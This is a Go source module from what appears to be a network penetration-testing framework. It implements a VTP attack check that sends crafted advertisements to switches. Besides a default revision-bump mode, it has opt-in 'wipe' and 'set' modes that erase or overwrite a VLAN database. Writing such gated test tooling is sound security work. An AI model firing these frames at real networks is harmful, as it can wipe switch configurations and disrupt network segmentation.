// vtp.go implements the VTP (VLAN Trunking Protocol) attack behavior.
//
// Modes (from the catalog):
//   - Default (SAFE mode): temporary, decays. The behavior sends a summary
//     advertisement with a revision bump and records the side effect. It
//     does NOT answer advertisement requests or push a VLAN database wipe.
//   - --wipe: permanent (requires the per-run opt-in). Wipes the VLAN
//     database by pushing a summary with revision 0 and empty VLANs.
//   - --set: permanent (requires the per-run opt-in). Overwrites the VLAN
//     database with the attacker's VLAN set.
//
// A run without a VTP domain in its target is skipped by the runner before
// any frame.

package l2

import (
	"context"
	"encoding/json"

	"go.aledante.io/FlowSeer/src/common/errs"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/layers"
)

type vtpFinding struct {
	Action   string `json:"action"`
	Domain   string `json:"domain"`
	Revision uint32 `json:"revision"`
	Mode     string `json:"mode"`
}

// RunVTP sends one advertisement into the target's VTP domain from the
// attack leg's MAC. The base mode sends a summary with a revision bump;
// the wipe and set modes send the destructive advertisement the gate has
// already admitted. The revision, timestamp, and VLAN set are probe
// content. The verdict is pending: whether a switch took the revision
// needs a read of the device that phase 2 adds.
func RunVTP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVTPDomain); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	mode := deps.Entry.Mode

	domain := deps.Target.VTPDomain
	revision := uint32(42)

	var vtp *layers.VTP
	switch mode {
	case "wipe":
		// Wipe: push a summary with revision 0 and no VLANs, causing
		// downstream switches to reset their VLAN database.
		vtp = &layers.VTP{
			Version:  layers.VTPVersion1,
			Code:     layers.VTPCodeSummary,
			Domain:   domain,
			Revision: 0,
		}
	case "set":
		// Set: push a subset advertisement with the attacker's VLANs.
		vtp = &layers.VTP{
			Version:  layers.VTPVersion1,
			Code:     layers.VTPCodeSubset,
			Seq:      1,
			Domain:   domain,
			Revision: revision + 1,
			VLANs: []layers.VTPVLANInfo{
				{VLANID: 10, Name: "attacker", MTU: 1500, Status: 0, Type: 1, ISLVLAN: 0, SAID: 0x10000A},
			},
		}
	default:
		// SAFE mode: send a summary advertisement with a revision bump.
		// This is the non-destructive default. The timestamp is set to
		// a deterministic value matching the fixture (the baseline uses
		// time.strftime for per-run randomness; the pin is field-set).
		vtp = &layers.VTP{
			Version:   layers.VTPVersion1,
			Code:      layers.VTPCodeSummary,
			Domain:    domain,
			Revision:  revision,
			Followers: 0,
			Timestamp: []byte("260823120000"),
		}
	}

	pkt, err := craftDot3SNAP(vtpDstMAC, src, snapPIDVTP, vtp)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "vtp: craft frame")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "vtp: send")
	}

	detail, _ := json.Marshal(vtpFinding{
		Action:   "vtp-advertisement",
		Domain:   domain,
		Revision: vtp.Revision,
		Mode:     modeName(mode),
	})
	deps.Emitter.Finding("vtp", detail)

	return check.Pending("no observable: revision acceptance needs a read of the device's VTP status"), nil
}
